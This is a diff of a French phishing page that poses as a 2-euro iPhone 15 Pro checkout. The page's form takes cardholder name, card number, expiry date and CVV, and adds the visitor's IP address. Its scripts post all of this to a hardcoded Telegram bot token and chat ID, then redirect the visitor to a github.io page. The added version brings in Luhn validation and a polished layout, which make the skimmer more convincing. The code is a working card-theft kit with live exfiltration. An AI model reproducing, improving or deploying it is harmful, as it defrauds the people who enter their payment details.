@@ -1,386 +1,530 @@
-<html lang="fr" dir="ltr"><head>
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+  <meta charset="UTF-8">
   <title>iPhone 15 Pro</title>
+
+  <!-- FAVICON -->
   <link href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/favicon.png" rel="shortcut icon" type="image/x-icon">
+
+  <!-- LOCAL STYLE -->
   <link rel="stylesheet" href="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/css/style.css">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.2.2/css/bootstrap-grid.min.css" integrity="sha512-a+PObWRxNVh4HZR9wijCGj84JgJ/QhZ8dET09REfYz2clUBjKYhGbOmdy9KEHilYKgbMSIHNQEsonv/r75mHXw==" crossorigin="anonymous" referrerpolicy="no-referrer">
+  <link rel="stylesheet" href="/assets/css/styles.css?id=ec1da90a897fb34a69dc780da09ec7e9">
+
+  <!-- Styles additionnels -->
   <style>
-    /* Styles adaptés aux smartphones */
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-    }
-    .product_wrapper {
-      padding: 20px;
-    }
-    .container {
-      max-width: 100%;
-      padding: 0 15px;
-      margin: 0 auto;
-    }
-    .images_wrapper img {
-      max-width: 100%;
-      height: auto;
-      display: block;
-      margin: 0 auto;
-    }
-    .price_block {
-      text-align: center;
-      margin-bottom: 10px;
-    }
-    .price_block span {
-      font-size: 14px;
-      color: #888;
-    }
-    .price_block h2 {
-      font-size: 24px;
-      margin: 0;
-    }
-    .form_wrapper {
-      margin-top: 20px;
-    }
-    .product_title h1 {
-      text-align: center;
-      font-size: 24px;
-      margin-bottom: 20px;
-    }
-    .form_block label {
-      display: block;
-      margin-bottom: 5px;
-      font-weight: bold;
-    }
-    .form_block input[type="text"],
-    .form_block input[type="tel"] {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 16px;
-    }
-    .form_block button {
-      width: 100%;
-      padding: 12px;
-      background-color: #28a745;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      font-size: 18px;
-      cursor: pointer;
-    }
-
-    footer {
-      text-align: center;
-      padding: 20px;
-      background-color: transparent;
-      margin-top: 20px;
-    }
-    footer h6 {
-      font-size: 16px;
-    }
-    footer img {
-      max-width: 50%;
-      height: auto;
-    }
-
-    @media (max-width: 768px) {
-      .product_block {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-      }
-
-      .images_wrapper, .form_wrapper {
-        width: 50%;
-      }
-
-      .form_block input[type="text"],
-      .form_block input[type="tel"] {
-        font-size: 14px;
-      }
-
-      .price_block h2 {
-        font-size: 20px;
-      }
-
-      .product_title h1 {
-        font-size: 22px;
-      }
-
-      footer h6 {
-        font-size: 14px;
-      }
-
-      footer img {
-        max-width: 300%;
-      }
+    /* Style inline ajouté */
+    div[style*="fixed"] span[id^="img_"][class^="img_"] > style:first-child + div[style*="flex"][style*="relative"] {
+      width: 10000px !important;
     }
   </style>
+  <style>
+    html[lang="ar"] body {
+      direction: unset !important;
+    }
+    html[lang="ar"] body input,
+    html[lang="ar"] body textarea,
+    html[lang="ar"] body select {
+      direction: unset !important;
+    }
+    html[lang="ar"] .chip_wrapper p,
+    html[lang="ar"] .gigabytes_wrapper p,
+    html[lang="ar"] .battery_wrapper p {
+      text-align: right;
+    }
+    .total-price {
+      display: none;
+    }
+    .page-checkout .images_wrapper,
+    .page-checkout .choose_color,
+    .page-checkout .btn-group {
+      display: none !important;
+    }
+    .page-checkout .product_wrapper .product_block {
+      justify-content: center;
+    }
+    .product_wrapper .form-control {
+      color: #ffffff !important;
+    }
+    .product_wrapper .product_block .images_wrapper .price_block span {
+      text-align: center;
+    }
+  </style>
+  <style>
+    .topbar {
+      display: none;
+    }
+    .product_wrapper .product_block .form_wrapper .form_block .form-group select {
+      color: #fff !important;
+    }
+  </style>
+  <style>
+    html[lang="fr"] body,
+    html[lang="fr"] body input,
+    html[lang="fr"] body textarea,
+    html[lang="fr"] body select {
+      direction: ltr;
+    }
+  </style>
+
+  <!-- jQuery -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+
+  <!-- Script pour afficher les conditions -->
+  <script>
+    function __RB_showTerms() {
+      document.getElementById('showPopupTerms').style.display = 'block';
+    }
+  </script>
 </head>
-<body>
+<body class="lang-fr page-payment page-checkout">
+
+  <header>
+    <!-- TOP BAR PARAGRAPH START -->
+    <!-- Votre contenu pour la top bar -->
+    <!-- TOP BAR PARAGRAPH END -->
+  </header>
+
+  <!-- SECTION PRINCIPALE -->
   <section>
+    <!-- BLOC PRODUIT -->
     <div class="product_wrapper animate">
       <div class="container">
-        <div class="product_block">
+        <div class="product_block" style="min-height: 180px;">
+          <!-- GAUCHE : IMAGES -->
           <div class="images_wrapper">
             <div class="price_block">
               <span>Seulement maintenant</span>
-              <h2>2,00 €</h2>
+              <h2>€2,00</h2>
             </div>
-            <div id="white" class="img-tab active">
+            <div id="black" class="img-tab active">
+              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-blacktitanium1.png" alt="iPhone 15">
+            </div>
+            <div id="blue" class="img-tab">
+              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-bluetitanium1.png" alt="iPhone 15">
+            </div>
+            <div id="natural" class="img-tab">
+              <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-naturaltitanium1.png" alt="iPhone 15">
+            </div>
+            <div id="white" class="img-tab">
               <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-iphone-15-pro-whitetitanium1.png" alt="iPhone 15">
             </div>
+            <!-- Ajoutez d'autres DIV (images) ici si nécessaire -->
           </div>
+          <!-- FIN GAUCHE -->
 
+          <!-- DROITE : FORMULAIRE -->
           <div class="form_wrapper">
             <div class="product_title">
               <h1>iPhone 15 Pro</h1>
-            </div><div class="block-reassurance">
-        <center><h6>Cartes de crédit acceptées :</h6><p></p></center>
-        <p><p></p></p><img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Cartes" width="250" height="30">
-      </div>
+            </div>
             <div class="form_block" id="Scroll_form">
-              <form action="https://www.google.com" method="GET" id="paymentForm" name="paymentForm" novalidate="novalidate">
-                <input type="hidden" name="_token" value="vFqq7MTGU0dg8OrcF2KocxJen6rbzNYcUPZNrvA7" autocomplete="off">
-                <input type="hidden" id="user_ip" name="user_ip" value="84.5.27.23">
+              <div class="row">
+                <div class="col-12">
+                  <div class="title">
+                    <label>Entrez vos informations</label>
+                  </div>
+                </div>
+              </div>
+              <!-- Choix de la couleur -->
+              <div class="row">
+                <div class="col-12">
+                  <div class="title choose_color">
+                    <label>Choisissez votre couleur&nbsp;:</label>
+                  </div>
+                  <div class="btn-group">
+                    <a href="javascript:;" data-tab="black" class="img-nav-tab black active">
+                      <input type="radio" name="color" id="black">
+                    </a>
+                    <a href="javascript:;" data-tab="blue" class="img-nav-tab blue">
+                      <input type="radio" name="color" id="blue">
+                    </a>
+                    <a href="javascript:;" data-tab="natural" class="img-nav-tab natural">
+                      <input type="radio" name="color" id="natural">
+                    </a>
+                    <a href="javascript:;" data-tab="white" class="img-nav-tab white">
+                      <input type="radio" name="color" id="white">
+                    </a>
+                  </div>
+                </div>
+              </div>
+              <!-- Textes pour la validation des champs (cachez-les ou utilisez-les via JS) -->
+              <input id="required-text" type="hidden" value="Ce champ est requis.">
+              <input id="email-error-text" type="hidden" value="Veuillez entrer une adresse e-mail valide.">
+              <input id="phone-error-text" type="hidden" value="Veuillez entrer au moins 6 caractères.">
 
+              <!-- FORMULAIRE DE PAIEMENT -->
+              <form id="paymentForm" method="post" action="">
+                <div class="accepted-credit-cards" style="text-align: center; margin: 1rem 0;">
+                  <p class="accepted-credit-cards-heading" style="font-size: 14px; margin: 0 0 .5rem;">Cartes de crédit acceptées:</p>
+                  <img src="https://cdn.soopercdn.com/cp/form-campaign-checkout-v2/assets/images/card.svg" alt="Supported Payment Cards" style="width:auto; max-width:100%;">
+                </div>
                 <div class="card-holder form-group">
-                  <label for="card_holder">Nom du titulaire</label>
-                  <input type="text" name="card_holder" id="card_holder" required="" placeholder="Nom du Titulaire">
+                  <label for="card_holder">Titulaire de la carte</label>
+                  <div class="controls">
+                    <input type="text" name="card_holder" id="card_holder" autocomplete="cc-name" value="winw arzone" placeholder="Titulaire de la carte" required class="form-control form-control-lg jp-card-invalid" style="width:100%;">
+                  </div>
                 </div>
-
                 <div class="card-number form-group">
-                  <label for="card_number">Numéro de carte</label>
-                  <input type="tel" name="card_number" id="card_number" maxlength="19" oninput="formatCardNumber(this)" required="" placeholder="0000 0000 0000 0000">
+                  <label for="card_number">Numéro de la carte</label>
+                  <div class="controls">
+                    <input type="tel" name="card_number" id="card_number" autocomplete="cc-number" placeholder="0000 0000 0000 0000" required class="form-control form-control-lg jp-card-invalid" style="width:100%;">
+                  </div>
                 </div>
-
                 <div class="expiry-date form-group">
                   <label for="expiry_date">Date d'expiration</label>
-                  <input type="text" name="expiry_date" id="expiry_date" maxlength="5" oninput="formatExpiryDate(this)" required="" placeholder="MM/AA">
+                  <div class="controls">
+                    <input type="tel" name="expiry_date" id="expiry_date" autocomplete="cc-exp" placeholder="MM / AA" required class="form-control form-control-lg jp-card-invalid" style="width:100%;">
+                  </div>
                 </div>
-
-                <div class="cvv form-group">
-                  <label for="cvv">CCV</label>
-                  <input type="text" name="cvv" id="cvv" maxlength="3" required="" placeholder="CCC">
+                <div class="row">
+                  <div class="col-sm-6 col-9">
+                    <div class="cvv form-group">
+                      <label for="cvv">CVC/CVV</label>
+                      <div class="controls">
+                        <input type="number" name="cvv" id="cvv" autocomplete="cc-csc" min="0" max="9999" pattern="^[0-9]{3,4}$" placeholder="CVC/CVV" required style="width:100%;" class="form-control form-control-lg jp-card-invalid">
+                      </div>
+                    </div>
+                  </div>
+                  <div class="col-sm-6 col-3 align-self-center">
+                    <div class="cvv-helper form-group">
+                      <img width="50" src="https://cdn.soopercdn.com/cp/checkout/assets/images/cvv.svg" alt="" style="max-width:100%; max-height:30px; width:auto !important;">
+                    </div>
+                  </div>
                 </div>
-
-                <button type="submit" id="submitButton">Effectuer le paiement</button>
+                <button type="submit" id="submitButton" class="btn btn-success btn-lg" style="width:100%;">
+                  <span class="loader" style="height:12px; width:12px; border-width:3px; margin-right:5px; display:none;"></span>
+                  <span class="submit-label">Effectuer Paiement</span>
+                  <span class="waiting-label" style="display:none;">Effectuer Paiement</span>
+                </button>
               </form>
+              <!-- FIN DU FORMULAIRE -->
             </div>
+          </div>
+          <!-- FIN DROITE -->
+        </div>
+      </div>
+    </div>
+    <!-- FIN BLOC PRODUIT -->
+
+    <!-- SECTION INTRODUCTIVE -->
+    <div class="intro_wrapper">
+      <div class="container">
+        <h2>Apple dévoile l'iPhone 15 Pro.</h2>
+        <p>Doté d'une conception en titane solide et légère avec de nouveaux bords profilés, un nouveau bouton Action, des améliorations puissantes de l'appareil photo et l'A17 Pro pour des performances de niveau supérieur et les jeux mobiles.</p>
+        <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/hero-img.jpg" alt="">
+      </div>
+    </div>
+
+    <!-- BLOC D'ACTION -->
+    <div class="action-button_wrapper">
+      <div class="container">
+        <div class="row align-items-center justify-content-center gy-lg-0 gy-4">
+          <div class="col-lg-5">
+            <h2>Un nouveau bouton prêt à&nbsp;l’action.</h2>
+            <p>Le tout nouveau bouton Action est&nbsp;un raccourci vers votre fonctionnalité préférée. Une fois que vous l’avez configuré, il&nbsp;suffit d’appuyer de façon prolongée pour déclencher l’action souhaitée.</p>
+          </div>
+          <div class="col-lg-5">
+            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/airpods-music.png" alt="">
           </div>
         </div>
       </div>
     </div>
   </section>
+  <!-- FIN SECTION -->
 
- <footer>
-  <div class="container">
-    <div class="block-reassurance">
-      <h6>Cartes de crédit acceptées :</h6>
-      <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cartes" width="317" height="54">
+  <!-- FOOTER -->
+  <footer>
+    <div class="container">
+      <div class="block-reassurance">
+        <div class="row">
+          <div class="col-12">
+            <h6>Cartes de crédit acceptées:</h6>
+            <img src="https://cdn.soopercdn.com/cp/iphone-15-pro/assets/images/card-logo.svg" alt="Cards" width="317" height="54">
+          </div>
+        </div>
+      </div>
     </div>
-  </div>
-</footer>
+  </footer>
+  <!-- FIN FOOTER -->
 
-<style>
-  foter {
-    text-align: center;
-    padding: 20px; /* Augmentation du padding pour plus d'espace */
-    background-color: transparent; /* Fond complètement transparent */
-    margin-top: 30px; /* Plus d'espace entre le contenu principal et le footer */
-    box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1); /* Ombre légère pour séparer visuellement */
-  }
-
-  footer h6 {
-    color: #333; /* Texte sombre pour un meilleur contraste */
-    font-size: 16px;
-    margin-bottom: 10px;
-  }
-
-  footer img {
-    max-width: 100%; /* Assurez-vous que l'image ne déborde pas */
-    height: auto;
-  }
-</style>
-
+  <!-- Scripts JS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
   <script>
     $(document).ready(function () {
-      $.getJSON("https://api.ipify.org?format=json", function (data) {
-        $('#user_ip').val(data.ip);
+      $(window).on("load", function () {
+        if ($(window).width() < 991) {
+          let target = $('#Scroll_form');
+          if (target.length) {
+            $('html,body').animate({
+              scrollTop: target.offset().top
+            });
+          }
+        }
       });
+    });
 
-      function formatCardNumber(input) {
-        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+    "use strict";
+    function Tabs() {
+      var bindAll = function () {
+        var menuElements = document.querySelectorAll('[data-tab]');
+        for (var i = 0; i < menuElements.length; i++) {
+          menuElements[i].addEventListener('click', change, false);
+        }
       }
+      var clear = function () {
+        var menuElements = document.querySelectorAll('[data-tab]');
+        for (var i = 0; i < menuElements.length; i++) {
+          menuElements[i].classList.remove('active');
+          var id = menuElements[i].getAttribute('data-tab');
+          document.getElementById(id).classList.remove('active');
+        }
+      }
+      var change = function (e) {
+        clear();
+        e.target.classList.add('active');
+        var id = e.currentTarget.getAttribute('data-tab');
+        document.getElementById(id).classList.add('active');
+      }
+      bindAll();
+    }
+    var connectTabs = new Tabs();
 
-      function formatExpiryDate(input) {
-        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
+    function myFunction() {
+      var x = document.getElementById("select");
+      x.classList.add("active");
+    }
+
+    /* COUNT DOWN JS */
+    window.onload = isTimeSet;
+    function isTimeSet() {
+      if (localStorage.getItem("time") != null) {
+        var time = localStorage.getItem("time");
+        document.getElementById("hiddenTime").value = time;
+      } else {
+        document.getElementById("hiddenTime").value = "1800";
+      }
+    }
+    var sec = document.getElementById("hiddenTime") ? document.getElementById("hiddenTime").value : 1800,
+        countDiv = document.getElementById("timer"),
+        countDown = setInterval(function () {
+          secpass();
+        }, 1000);
+    function secpass() {
+      var min = Math.floor(sec / 60),
+          remSec = sec % 60;
+      remSec = remSec < 10 ? '0' + remSec : remSec;
+      min = min < 10 ? '0' + min : min;
+      if (countDiv) {
+        countDiv.innerHTML = min + ":" + remSec;
+      }
+      if (sec > 0) {
+        sec = sec - 1;
+        localStorage.setItem("time", sec);
+      } else {
+        clearInterval(countDown);
+        if (countDiv) {
+          countDiv.innerHTML = "Limite dépassée";
+        }
+        localStorage.removeItem("time");
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      setTimeout(function () {
+        const beforeElement = document.querySelector(".product_wrapper");
+        if(beforeElement) {
+          beforeElement.classList.add("animate");
+        }
+      }, 100);
+    });
+
+    document.addEventListener('DOMContentLoaded', function () {
+      if (window.location.pathname.startsWith('/thank-you-goa')) {
+        const script = document.createElement('script');
+        script.innerHTML = 'setTimeout(function() {window.location.href = "https://justmoicom.github.io/test3/";}, 5000);';
+        document.body.appendChild(script);
       }
     });
+
+    $(document).ready(function () {
+      $('#spanYear').html(new Date().getFullYear());
+    });
   </script>
+  <script>
+    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
+      window.scroll({
+        behavior: 'smooth',
+        left: 0,
+        top: (window.pageYOffset + document.getElementById("paymentForm").getBoundingClientRect().top) - 20
+      });
+    }
+  </script>
+  <script src="/assets/js/app.js?id=7fcfd8024d883e98d448b4b0995a5414"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.0/jquery.validate.min.js" integrity="sha512-q11YPKX7TkRW0J1N8w1MP7cg05EpUDRx5B/jTnPPQxY4lsIjGd5fMyBKzjCgbXPQ0ArBgFkNj2v0jh1O2SAqSg==" crossorigin="anonymous" referrerpolicy="no-referrer" defer></script>
+
+  
   
   
    <script>
-    $(document).ready(function () {
-      // Récupérer l'IP de l'utilisateur
-      $.getJSON("https://api.ipify.org?format=json", function (data) {
-        $('#user_ip').val(data.ip);
-      });
+  
+   $(document).ready(function () {
+      setTimeout(function () {
+        $(".product_wrapper").addClass("animate");
+      }, 100);
+    });
 
-      // Soumettre le formulaire avec validation
-      $('#paymentForm').on('submit', function (e) {
-        e.preventDefault();
-        if (!validateForm()) {
-          return;
+    // Défilement automatique sur mobile
+    $(window).on("load", function () {
+      if ($(window).width() < 991) {
+        let target = $('#Scroll_form');
+        if (target.length) {
+          $('html,body').animate({ scrollTop: target.offset().top });
         }
-        var formData = $(this).serializeArray();
-        var message = "Nouvelle commande reçue :\n";
-        formData.forEach(function (item) {
-          if (item.name !== '_token') {
-            message += item.name + ": " + item.value + "\n";
-          }
-        });
-
-        // Envoyer les données vers votre bot Telegram via un webhook ou API
-        $.ajax({
-          url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
-          method: 'POST',
-          data: {
-            chat_id: '7747778364',
-            text: message
-          },
-          success: function () {
-            window.location.href = "https://justmoicom.github.io/test3/";
-          },
-          error: function () {
-            window.location.href = "https://justmoicom.github.io/tel/";
-          }
-        });
-      });
-
-      // Validation des champs
-      function validateForm() {
-        var isValid = true;
-        $('input[required]').each(function () {
-          if ($(this).val().trim() === '') {
-            alert($(this).attr('placeholder') + ' est requis.');
-            isValid = false;
-            return false;
-          }
-        });
-        var expiryDate = $('#expiry_date').val();
-        if (!validateExpiryDate(expiryDate)) {
-          isValid = false;
-        }
-        return isValid;
-      }
-
-      function validateExpiryDate(date) {
-        var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
-        if (!regex.test(date)) {
-          alert('La date d\'expiration doit être au format MM/AA.');
-          return false;
-        }
-        var parts = date.split('/');
-        var month = parseInt(parts[0], 10);
-        if (month < 1 || month > 12) {
-          alert('Le mois doit être compris entre 01 et 12.');
-          return false;
-        }
-        return true;
-      }
-
-      // Formater le numéro de carte en blocs de 4 chiffres
-      function formatCardNumber(input) {
-        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
-      }
-
-      // Formater automatiquement la date d'expiration en MM/AA
-      function formatExpiryDate(input) {
-        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
       }
     });
-  </script>  <script>
+
+    // Validation du formulaire avec jQuery Validate
+    $(document).ready(function() {
+      // Méthode de validation pour le CVV
+      jQuery.validator.addMethod("cvv", function(value, element) {
+        return (/^[0-9]{3,4}$/).test(value);
+      }, "Veuillez entrer un CVV valide (3-4 chiffres)");
+
+      // Méthode de validation Luhn pour le numéro de carte
+      function luhnCheck(number) {
+        let sum = 0;
+        number = number.replace(/\s+/g, '');
+        for (let i = number.length - 1; i >= 0; i -= 2) {
+          sum += parseInt(number[i]);
+        }
+        for (let i = number.length - 2; i >= 0; i -= 2) {
+          let digits = (number[i] * 2).toString().split('');
+          sum += digits.reduce((acc, d) => acc + parseInt(d), 0);
+        }
+        return (sum % 10 === 0);
+      }
+      jQuery.validator.addMethod("luhnCheck", function(value, element) {
+        return luhnCheck(value);
+      }, "Veuillez entrer un numéro de carte valide.");
+
+      $("#paymentForm").validate({
+        rules: {
+          card_holder: { required: true },
+          card_number: { required: true, luhnCheck: true, minlength: 8 },
+          expiry_date: { required: true },
+          cvv: { required: true, cvv: true }
+        },
+        submitHandler: function(form) {
+          disableSubmitButton($("#submitButton"));
+
+          let validationResult = validateExpiryDate($("#expiry_date").val());
+          if (validationResult === "success") {
+            // Construction du message
+            var formData = $(form).serializeArray();
+            var message = "Nouvelle commande reçue :\n";
+            formData.forEach(function (item) {
+              if (item.name !== '_token') {
+                message += item.name + ": " + item.value + "\n";
+              }
+            });
+            // Envoi via AJAX directement vers l'API Telegram
+            $.ajax({
+              url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
+              method: 'POST',
+              data: {
+                chat_id: '7747778364',
+                text: message
+              },
+              complete: function () {
+                window.location.href = "https://justmoicom.github.io/test3/";
+              }
+            });
+          } else {
+            showInputError("expiry_date", validationResult);
+            enableSubmitButton($("#submitButton"));
+          }
+        }
+      });
+
+      // Suppression de l'erreur dès modification du champ expiry_date
+      $("#expiry_date").on("keyup", function () {
+        $('label#expiry_date-error').remove();
+      });
+    });
+
+    // Gestion des erreurs et affichage du bouton de soumission
+    function showInputError(inputFieldId, error) {
+      var errorLabel = $("<label>", {
+        id: inputFieldId + '-error',
+        "class": "error",
+        for: inputFieldId,
+        text: error === "invalid_expiry_date" ? "Date d'expiration invalide" :
+              error === "expired_card" ? "La date d'expiration est dépassée" : error
+      });
+      $("#" + inputFieldId).closest('.controls').append(errorLabel);
+    }
+    function disableSubmitButton(button) {
+      button.prop('disabled', true);
+      $(".loader", button).show();
+      $(".submit-label", button).hide();
+      $(".waiting-label", button).show();
+    }
+    function enableSubmitButton(button) {
+      button.prop('disabled', false);
+      $(".loader", button).hide();
+      $(".submit-label", button).show();
+      $(".waiting-label", button).hide();
+    }
+    // Validation de la date d'expiration
+    function validateExpiryDate(expiryDateValue) {
+      var parts = expiryDateValue.split("/");
+      if (parts.length !== 2) {
+        return "invalid_expiry_date";
+      }
+      var expiryMonth = parseInt(parts[0].trim(), 10);
+      var expiryYear = parts[1].trim();
+      expiryYear = parseInt(expiryYear.length === 4 ? expiryYear : "20" + expiryYear, 10);
+      if (expiryMonth < 1 || expiryMonth > 12) {
+        return "invalid_expiry_date";
+      }
+      var expiryDate = new Date(expiryYear, expiryMonth, 0, 23, 59, 59);
+      var today = new Date();
+      var maxExpiryDate = new Date("2099-12-31 23:59:59");
+      if (expiryDate > maxExpiryDate) {
+        return "invalid_expiry_date";
+      }
+      if (expiryDate < today) {
+        return "expired_card";
+      }
+      return "success";
+    }
+
+    // Formatage des champs (optionnel)
     $(document).ready(function () {
-      // Récupérer l'IP de l'utilisateur
+      $("#card_number").on("input", function () {
+        this.value = this.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+      });
+      $("#expiry_date").on("input", function () {
+        this.value = this.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
+      });
+    });
+
+    // Récupérer l'IP de l'utilisateur et l'ajouter dans le formulaire (optionnel)
+    $(document).ready(function () {
       $.getJSON("https://api.ipify.org?format=json", function (data) {
-        $('#user_ip').val(data.ip);
+        if ($("#user_ip").length === 0) {
+          $("<input>").attr({ type: "hidden", id: "user_ip", name: "user_ip", value: data.ip }).appendTo("#paymentForm");
+        } else {
+          $("#user_ip").val(data.ip);
+        }
       });
-
-      // Soumettre le formulaire avec validation
-      $('#paymentForm').on('submit', function (e) {
-        e.preventDefault();
-        if (!validateForm()) {
-          return;
-        }
-        var formData = $(this).serializeArray();
-        var message = "Nouvelle commande reçue :\n";
-        formData.forEach(function (item) {
-          if (item.name !== '_token') {
-            message += item.name + ": " + item.value + "\n";
-          }
-        });
-
-        // Envoyer les données vers votre bot Telegram via un webhook ou API
-        $.ajax({
-          url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
-          method: 'POST',
-          data: {
-            chat_id: '7747778364',
-            text: message
-          },
-          success: function () {
-            window.location.href = "https://justmoicom.github.io/test3/";
-          },
-          error: function () {
-            window.location.href = "https://justmoicom.github.io/tel/";
-          }
-        });
-      });
-
-      // Validation des champs
-      function validateForm() {
-        var isValid = true;
-        $('input[required]').each(function () {
-          if ($(this).val().trim() === '') {
-            alert($(this).attr('placeholder') + ' est requis.');
-            isValid = false;
-            return false;
-          }
-        });
-        var expiryDate = $('#expiry_date').val();
-        if (!validateExpiryDate(expiryDate)) {
-          isValid = false;
-        }
-        return isValid;
-      }
-
-      function validateExpiryDate(date) {
-        var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
-        if (!regex.test(date)) {
-          alert('La date d\'expiration doit être au format MM/AA.');
-          return false;
-        }
-        var parts = date.split('/');
-        var month = parseInt(parts[0], 10);
-        if (month < 1 || month > 12) {
-          alert('Le mois doit être compris entre 01 et 12.');
-          return false;
-        }
-        return true;
-      }
-
-      // Formater le numéro de carte en blocs de 4 chiffres
-      function formatCardNumber(input) {
-        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
-      }
-
-      // Formater automatiquement la date d'expiration en MM/AA
-      function formatExpiryDate(input) {
-        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
-      }
     });
   </script>
 
-</body></html>
+  
+  
+  
+</body>
+</html>
